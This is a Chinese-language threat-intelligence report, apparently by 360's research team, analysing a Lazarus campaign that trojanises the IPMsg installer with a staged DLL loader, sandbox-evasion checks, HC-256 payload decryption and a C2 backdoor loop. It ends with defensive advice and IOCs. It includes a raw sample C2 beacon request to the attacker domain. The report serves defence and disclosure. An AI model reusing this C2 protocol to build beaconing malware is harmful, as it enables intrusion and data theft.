---
title: APT-C-26（Lazarus）组织使用武器化的IPMsg软件的攻击活动分析
url: https://mp.weixin.qq.com/s?__biz=MzUyMjk4NzExMA==&mid=2247505438&idx=1&sn=cf1947c7af6581f4a66460ae6d14dc2f&chksm=f9c1e517ceb66c01a0042c524512f4989d493692420a54d42fa07a6e5ae32f6d07f83c9943c3&scene=58&subscene=0#rd
source: 360威胁情报中心
date: 2024-12-27
fetch_date: 2025-10-06T19:38:26.216475
---

# APT-C-26（Lazarus）组织使用武器化的IPMsg软件的攻击活动分析

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/6CNEHNicic4PrtUnYxa8xdboQbHJib4KFY8wjC0dEXeFV7ViaxicjNJAtF4yUkGb2eb7ibPuXQaJySXAuYNOWB6ANwYQ/0?wx_fmt=jpeg)

# APT-C-26（Lazarus）组织使用武器化的IPMsg软件的攻击活动分析

原创

高级威胁研究院

360威胁情报中心

**APT-C-26**

**Lazarus**

APT-C-26（Lazarus）组织是一个高度活跃的高级持续性威胁（APT）组织，以其精密和隐蔽的攻击手段而闻名。该组织主要瞄准金融机构和加密货币交易所，运用一系列复杂的攻击策略，包括精心设计的网络钓鱼、直接网络攻击以及勒索软件攻击。这些行为反映了该组织在网络安全领域的高度技术能力和对目标的深入了解。

最近，360高级威胁研究院发现Lazarus组织对IPMsg安装程序进行了武器化处理。他们通过植入恶意代码，将其转变为一种攻击工具。当用户执行这个武器化的IPMsg安装程序后，它一方面会释放官方版本的IPMsg安装程序5.6.18.0并执行，以迷惑用户；另一方面，它会在内存中激活一个恶意的DLL文件。经过多个阶段的执行后，该恶意DLL文件会与远程的控制服务器（C2）建立连接，以便下载后门程序并窃取用户的敏感信息。

这种攻击方式展示了Lazarus组织在社会工程学方面的技巧和策略，有效地诱导用户执行恶意程序，窃取敏感信息。在本报告中，我们将深入探讨这一攻击活动的整体样本行为和细节，以期更好地理解Lazarus组织的攻击策略和技巧，为制定更有效的防御措施提供支持。

# **一、攻击活动分析**

## **1.攻击流程分析**

攻击者向目标发送了武器化的IPMsg安装程序。当用户执行这个程序后，它会释放一个恶意的DLL文件。这个DLL文件首先会释放官方版本的IPMsg安装程序5.6.18.0并执行，以此来迷惑用户。接着，恶意DLL文件会在内存中解密并释放多个额外的DLL文件。这些DLL文件经过一系列操作后，最终形成了一个后门，持续与远程的控制服务器（C2）进行通信。通过这种通信，攻击者可以获取并执行后续的载荷，进一步实施攻击和窃取敏感信息。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4Ppdtqbu3qtibibUo2vkgeXMYKpK1IDjvPiaUaBSpoahHI78H0CN24U2NdRxP1wic9PHBZYN3b4FcFFZ6g/640?wx_fmt=png)

图1  攻击流程图

## **2.载荷分析**

在执行武器化的IPMsg安装程序后，样本首先从数据段解密PE文件，模块名为ATT\_Loader\_DLL.dll。随后，程序控制流跳转至导出函数WinOrgBinW处开始执行。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4Ppdtqbu3qtibibUo2vkgeXMYKmnQvOCoMfbE5ZdicQBYOia1lqYh4TAr8NuFicxbA9k5suyjZwtDHL9rcQ/640?wx_fmt=png)

图2 解密PE文件

攻击者在ATT\_Loader\_DLL.dll的WinOrgBinW函数入口处进行了校验，以确保栈中的字符与内存中的字符相匹配，我们将其称为DLL校验值。这些栈中的字符是由释放该DLL的样本所写入的，从而防止了DLL样本在沙箱环境中独立运行。同样地，在后续释放的DLL中也进行了类似的校验。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4Ppdtqbu3qtibibUo2vkgeXMYKAYyLagIQ17t8wGhMLicqo05yZd32B8ZFkIdnk7gO2JHMHNkMf2gdu7Q/640?wx_fmt=png)

图3 防御规避手段

ATT\_Loader\_DLL.dll在%appdata%\installer.exe路径下释放了官方版本IPMsg Installer 5.6.18.0程序，并打开执行。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4Ppdtqbu3qtibibUo2vkgeXMYKuMficjS9lYk3QgialptjSlF2eiaHichpEMPJDUfq3PTMEbuvNdARrJ6x9w/640?wx_fmt=png)

图4 释放官方IPMsg Installer程序

接着，程序加载了数据段中保存的另一个DLL文件，导出名为Loader1.dll，并执行了其导出函数GetsPrintW。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PqWOyCtibleFQjaDmSsZ3xic4rW4PZMMI1jVraNgMqR56JXeb0pv14nJoR88XzuagBzS9iaqIRhUzHVA/640?wx_fmt=png&from=appmsg)

图5 执行Loader1.dll导出函数GetsPrintW

Loader1.dll再次解密了一个DLL文件，并加载了其导出函数GetWindowSizedW。在这个过程中，再次解密的DLL导出模块名为Dll64.dll。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4Ppdtqbu3qtibibUo2vkgeXMYKibVsRN1Wl3vn0jicLCEFq9ocvV7D15t6fVKH7hibbZdZDeEHfta0kCskA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4Ppdtqbu3qtibibUo2vkgeXMYKiaLufo6mAxs81X8qaoytzWpdr4bTmnRgXbnja584ppPdqZMs6myTNfA/640?wx_fmt=png)

图6 解密和加载Dll64.dll

Dll64.dll将DLL校验值和系统当前时间进行Base64编码，然后生成一些包含随机字符的字符串，并将其作为HTTP请求的一部分发送出去。以下是一个示例：

表1  HTTP请求示例

|  |
| --- |
| POST /upgrade/latest.asp HTTP/1.1  Content-Type: application/x-www-form-urlencoded  Connection: Keep-Alive  User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; Win64; x64; Trident/8.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)  Host: cryptocopedia.com  Content-Length: 165  Cache-Control: no-cache                      NT=OTDJHGPNHK&WPKQO=MDcwMTY0NDB6NUYyNWg4Nw==&AQUG=&LKJGDZ=0&HCRPGG=52&GFJLEC=MgAwADIANAAtADEAMQAtADEANQAgADEAMgA6ADEANAA6ADAAOQA=&QTUYVKP=VEAADXTKHXWDDO&AMMMWIFVR=OM |

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4Ppdtqbu3qtibibUo2vkgeXMYKl97Ok0QQeN1MgW17rhpTeDw4BoNMqlKuhvOakHLAp4iadwibo1Acicziaw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4Ppdtqbu3qtibibUo2vkgeXMYKicBlXcI8BJnszeuneRibxfbFBRcvRH3ib53pLey8BOf4NeM2UAibDqmWPQ/640?wx_fmt=png)

图7 通过随机字符串创建HTTP请求并发送请求

随后，样本从命令和控制（C2）服务器接收数据。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4Ppdtqbu3qtibibUo2vkgeXMYK0pW0LeJdkicR7fPsKzrzlcOqHA8jTnDVjEZyL0lFYHxwb3F01ic4V4XQ/640?wx_fmt=png)

图8 接收数据

接下来，样本对接收到的数据进行处理，将其中的空格替换为+符号。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4Ppdtqbu3qtibibUo2vkgeXMYKhjGSXqu8Lwe3pAjPdLTLibZO6ykPCZoeuGicibSLUicujxjicKVeGXYGDLA/640?wx_fmt=png)

图9 替换空格代码

接下来，样本使用已知的字典对数据进行替换解码，以获得正常的数据。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4Ppdtqbu3qtibibUo2vkgeXMYKMN9YiaxNFWqVNJUo31ItYLEdAStDf8btIJLVcdRaj2KzItIYWB8Pt0Q/640?wx_fmt=png)

图10 数据解码

解码后的数据被分为五个部分，分别以“|”符号分割。这五个部分的数据分别表示：后续DLL执行结果每次传输到C2的最大尺寸（KB）、再次接收载荷的长度、DLL的导出函数、与前述类似的DLL校验值以及载荷的MD5哈希值。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4Ppdtqbu3qtibibUo2vkgeXMYKibsV0VKibS1BAenZ5tHDOqkoibvgnIiaNckY3wDgZ2n4VrXbPk2O5ntgqQ/640?wx_fmt=png)

图11 获取数据五个部分

在成功解析这五个部分后，样本开始从命令和控制（C2）服务器获取后续载荷。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4Ppdtqbu3qtibibUo2vkgeXMYKibaZVyKiar52eibks5XZQqhhQxrJqcLUty18pt4rrW35FLLeBE59g11Jw/640?wx_fmt=png)

图12 从C2获取载荷

样本对接收到的载荷计算MD5哈希值，并将其与之前接收的MD5数值进行比较。如果两者不匹配，则向命令和控制（C2）服务器发送“hash error”的错误信息。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4Ppdtqbu3qtibibUo2vkgeXMYKx8qXb5dcHjjP3rP2WtUdjIVIia6BhQFk0fRFicPGmpoSQUIiaZfp4PCTg/640?wx_fmt=png)

图13 MD5比对

在成功校验载荷后，使用流密码算法HC-256进行解密。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PqWOyCtibleFQjaDmSsZ3xic4icXbMOgpHWCzqibhymzDQfGbRTJsQZOibUcS8KmKsO1tAibXOVkoKwGbEw/640?wx_fmt=png&from=appmsg)

图14 hc-256解密数据

解密后的数据是一个ZIP压缩文件。样本会检查压缩文件内的DLL文件名是否为'Z'。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PqWOyCtibleFQjaDmSsZ3xic4Bx2N4EO7nujxiaOIser9hBxs53gKZDl9cGkGQkUaia7AvDVIP0lCq9CQ/640?wx_fmt=png&from=appmsg)

图15 ZIP校验

如果校验成功，样本会对ZIP文件进行解压缩，并对其中的DLL文件进行校验。如果校验失败，则向命令和控制（C2）服务器发送“Dll Data Error”的错误信息。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4Ppdtqbu3qtibibUo2vkgeXMYKcxP6nInib7v2MeuqlpFjhHI0xXoCzAB7wet1cNSDkn1EN0NlUfgecyQ/640?wx_fmt=png)

图16 DLL校验

接下来，样本执行之前解析的DLL导出函数，并对其执行结果进行CRC32校验。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4Ppdtqbu3qtibibUo2vkgeXMYKBdZUJZEAWSH7yWBicRWe80NzDKHfmt84Byoiab2J42W3LacJBT8hLHqg/640?wx_fmt=png)

图17 执行导出函数

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4Ppdtqbu3qtibibUo2vkgeXMYKYrT8nr44DejicicibD4FavD4DkNsEJnD0kUG9p4oQlYkW79icnBEtrKEMQ/640?wx_fmt=png)

图18 CRC32校验

最后，样本将导出函数的执行结果分段发送到远程的命令和控制（C2）服务器，其中每次传输的最大尺寸根据之前获取的“后续DLL执行结果每次传输到C2的最大尺寸（KB）”数据来确定。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4Ppdtqbu3qtibibUo2vkgeXMYKMFUFlzABXf3uSdibuNbJPud7au87aXVNUS3JO2pl1NVYZ2Y9HHbZibEg/640?wx_fmt=png)

图19 数据发送到C2

在完成上述通信后，样本会进入休眠状态一段时间。然后，在while (1)循环结构的作用下，样本会反复与命令和控制（C2）服务器进行通信，获取数据并形成后门机制。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4Ppdtqbu3qtibibUo2vkgeXMYKt23j1wFExfo0ofIxFs8JMhwUSP45Cwk8q23wibMBvXkSRlc9PwNG3jg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4Ppdtqbu3qtibibUo2vkgeXMYKffyswpzDowuD3r9COJIw7pibOvlnqrrQrJpJr8jia2g2gR7LwjOzJicSQ/640?wx_fmt=png)

图20 样本持续性通信

# **二、归属研判**

在这次攻击活动中，Lazarus组织使用了域名cryptocopedia[.]com作为其控制服务器（C2）。值得注意的是，这个域名在Lazarus组织的其他活动中也曾被使用过[1][2]。此外，本次攻击活动中使用的URL（https://cryptocopedia[.]com/upgrade/latest.asp）与Lazarus组织以往活动中使用的URL（https://cryptocopedia[.]com/explorer/search.asp）非常相似。

其次，结合地缘政治目标以及武器化官方程序的特征，我们发现这些都与Lazarus组织所表现出的战术、技术和程序（TTP）特征相符。因此，我们有理由相信此次攻击活动是由Lazarus组织发起的。

# **三、防范排查建议**

在本次攻击活动中，Lazarus组织巧妙地构建了IPMsg安装程序，诱使用户执行，其最终目的是窃取用户的重要信息。基于我们的深入洞察和分析，我们已经制定了一系列专门的防范和排查建议，旨在帮助识别和防御类似的恶意活动。

* 警惕社交平台来源：对于所有通过社交平台接收到的文件和链接，保持高度警惕，特别是那些来自未知或不可信来源的。不要轻易信任或打开这些来源的文件。
* 从官方平台下载程序：确保应用程序来源于官方，并使用360安全卫士进行全面扫描。
* 使用360安全卫士：利用360安全卫士全面扫描系统，寻找恶意软件和其他可疑活动的迹象。
* 员工安全意识培训：定期对员工进行安全意识培训，帮助他们识别潜在的网络钓鱼攻击和可疑通信，提高安全防范能力。
* 及时更新操作系统和软件：定期更新操作系统和所有软件，包括安全防护软件。确保及时修补已知的安全漏洞，降低被攻击的风险。

#

**附录 IOC**

#

a7b23cd8b09a3ce918a77de355e9d3e5

https://cryptocopedia[.]com/upgrade/latest.asp

#

**参考**

#

[1]https://blog.phylum.io/new-tactics-from-a-familiar-threat/

[2]https://hackhunting.com/2024/08/24/software-supply-chain-threat-landscape-july-2024-pypi-npm-github-and-macos/

**团队介绍**

TEAM INTRODUCTION

**360****高级威胁研究院**

360高级威胁研究院是360数字安全集团的核心能力支持部门，由360资深安全专家组成，专注于高级威胁的发现、防御、处置和研究，曾在全球范围内率先捕获双杀、双星、噩梦公式等多起业界知名的0day在野攻击，独家披露多个国家级APT组织的高级行动，赢得业内外的广泛认可，为360保障国家网络安全提供有力支撑。

预览时标签不可点

修改于

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4Pruscv37D0qgOMbfC4jVxUnso6yyhQC9OIyDNX6TYo5k8iafcfZMzT0ia5boCo69WZSicq7krbicKaHsw/0?wx_fmt=png)

360威胁情报中心

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许...